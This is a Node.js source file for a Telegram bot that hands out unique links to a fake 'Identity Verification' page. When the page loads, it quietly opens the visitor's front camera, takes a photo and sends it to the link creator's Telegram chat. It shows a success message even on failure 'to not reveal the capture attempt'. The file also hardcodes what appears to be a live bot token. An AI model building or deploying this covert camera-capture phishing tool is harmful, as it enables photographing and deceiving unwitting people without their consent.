// Telegram Photo Capture Bot
// Install dependencies: npm install node-telegram-bot-api express multer uuid

const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');
const path = require('path');

// Configuration
const TELEGRAM_TOKEN = '8276842153:AAF9BCMLa_b-Zpo-YdKl1HDbsIS4kqVKRuk'; // Get from @BotFather
const WEBAPP_URL = 'https://dataplug.zone.id'; // Your deployed URL
const PORT = process.env.PORT || 3000;

// Initialize bot and express
const bot = new TelegramBot(TELEGRAM_TOKEN, { polling: true });
const app = express();

// Store active links with their creator's chat ID
const activeLinks = new Map();

// Configure multer for image upload
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

// Serve static files
app.use(express.static('public'));
app.use(express.json());

// Bot command: /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, 
    '👋 Welcome to Photo Capture Bot!\n\n' +
    'Click the button below to generate a unique capture link.',
    {
      reply_markup: {
        inline_keyboard: [[
          { text: '🔗 Generate Link', callback_data: 'generate_link' }
        ]]
      }
    }
  );
});

// Handle callback query for generating link
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  
  if (query.data === 'generate_link') {
    const linkId = uuidv4();
    const captureUrl = `${WEBAPP_URL}/capture/${linkId}`;
    
    // Store link with creator's chat ID
    activeLinks.set(linkId, {
      chatId: chatId,
      createdAt: Date.now()
    });
    
    bot.sendMessage(chatId, 
      `✅ Link generated successfully!\n\n` +
      `🔗 Share this link:\n${captureUrl}\n\n` +
      `⏰ Link expires in 24 hours\n` +
      `📸 You'll receive the photo when someone opens it.`,
      {
        reply_markup: {
          inline_keyboard: [[
            { text: '🔗 Generate Another', callback_data: 'generate_link' }
          ]]
        }
      }
    );
    
    bot.answerCallbackQuery(query.id);
  }
});

// Serve the capture page
app.get('/capture/:linkId', (req, res) => {
  const { linkId } = req.params;
  
  if (!activeLinks.has(linkId)) {
    return res.status(404).send('Link not found or expired');
  }
  
  res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify Your Identity</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
        }
        .icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 30px;
            font-size: 40px;
        }
        h1 {
            color: #333;
            text-align: center;
            margin-bottom: 15px;
            font-size: 28px;
        }
        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.6;
        }
        .loading {
            text-align: center;
            padding: 30px 0;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #667eea;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .success {
            color: #4CAF50;
            text-align: center;
            font-size: 18px;
            padding: 20px;
        }
        .checkmark {
            font-size: 50px;
            color: #4CAF50;
            margin-bottom: 15px;
        }
        #video {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon">🔐</div>
        <h1>Identity Verification</h1>
        <p class="subtitle">Please wait while we verify your security credentials...</p>
        
        <div class="loading" id="loading">
            <div class="spinner"></div>
            <p>Analyzing security...</p>
        </div>
        
        <div id="success" style="display:none;">
            <div class="checkmark">✓</div>
            <div class="success">Verification Complete!</div>
        </div>
    </div>

    <video id="video" autoplay playsinline></video>
    
    <script>
        const linkId = '${linkId}';
        
        async function capturePhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' } 
                });
                
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // Wait for video to be ready
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });
                
                // Wait a moment for better quality
                await new Promise(resolve => setTimeout(resolve, 1000));
                
                // Capture photo
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // Convert to blob
                const blob = await new Promise(resolve => 
                    canvas.toBlob(resolve, 'image/jpeg', 0.95)
                );
                
                // Send to server
                const formData = new FormData();
                formData.append('photo', blob, 'capture.jpg');
                formData.append('linkId', linkId);
                
                await fetch('/upload', {
                    method: 'POST',
                    body: formData
                });
                
                // Stop camera
                stream.getTracks().forEach(track => track.stop());
                
                // Show success
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').style.display = 'block';
                
            } catch (error) {
                console.error('Error:', error);
                // Show success anyway to not reveal the capture attempt
                document.getElementById('loading').style.display = 'none';
                document.getElementById('success').style.display = 'block';
            }
        }
        
        // Start capture when page loads
        window.addEventListener('load', () => {
            setTimeout(capturePhoto, 500);
        });
    </script>
</body>
</html>
  `);
});

// Handle photo upload
app.post('/upload', upload.single('photo'), async (req, res) => {
  const { linkId } = req.body;
  
  if (!activeLinks.has(linkId)) {
    return res.status(404).json({ error: 'Invalid link' });
  }
  
  const linkData = activeLinks.get(linkId);
  const photo = req.file.buffer;
  
  try {
    // Send photo to the bot creator
    await bot.sendPhoto(linkData.chatId, photo, {
      caption: `📸 New capture from link: ${linkId.substring(0, 8)}...\n` +
               `⏰ Captured at: ${new Date().toLocaleString()}`
    });
    
    // Optionally remove link after first use
    // activeLinks.delete(linkId);
    
    res.json({ success: true });
  } catch (error) {
    console.error('Error sending photo:', error);
    res.status(500).json({ error: 'Failed to send photo' });
  }
});

// Clean up expired links (older than 24 hours)
setInterval(() => {
  const now = Date.now();
  for (const [linkId, data] of activeLinks.entries()) {
    if (now - data.createdAt > 24 * 60 * 60 * 1000) {
      activeLinks.delete(linkId);
    }
  }
}, 60 * 60 * 1000); // Check every hour

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log('Bot is active and ready!');
});